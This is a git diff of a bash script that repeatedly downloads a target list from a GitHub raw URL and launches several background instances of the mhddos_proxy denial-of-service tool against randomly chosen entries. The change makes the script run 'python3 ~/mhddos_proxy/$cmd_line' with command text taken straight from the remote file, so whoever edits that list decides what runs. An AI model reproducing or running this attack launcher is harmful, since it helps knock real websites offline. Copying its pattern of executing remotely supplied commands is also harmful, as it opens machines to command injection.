@@ -38,7 +38,7 @@ while true
 echo "#####################################"
 do
    # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | tail -n +6 | wc -l)
+   list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | grep "runner.py" | wc -l)
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
@@ -50,22 +50,22 @@ do
    echo -e "Choosen targets:\n"
    for i in $random_numbers
    do
-             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | tail -n +6)")
+             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat)")
              echo -e "-- "$site"\n"
    done
       
    # Launch multiple runner instances with different targets and different attack types.
    for i in $random_numbers
    do
-            # Get target (line) from targets list
-            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | tail -n +6)")
+            # Filter and only get lines that starts with "runner.py". Then get one target from that new list.
+            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/runner_targets | cat | grep "runner.py")")
             
             # Cut "command line" from string. Command line is everything before "#" that is used as delimiter for comments purpose.
             cmd_line=$(echo $site | awk -F "#" '{print $1}')
             
             #echo $cmd_line
             
-            python3 ~/mhddos_proxy/runner.py $cmd_line&
+            python3 ~/mhddos_proxy/$cmd_line&
    done
 echo "#####################################"
 sleep $restart_interval
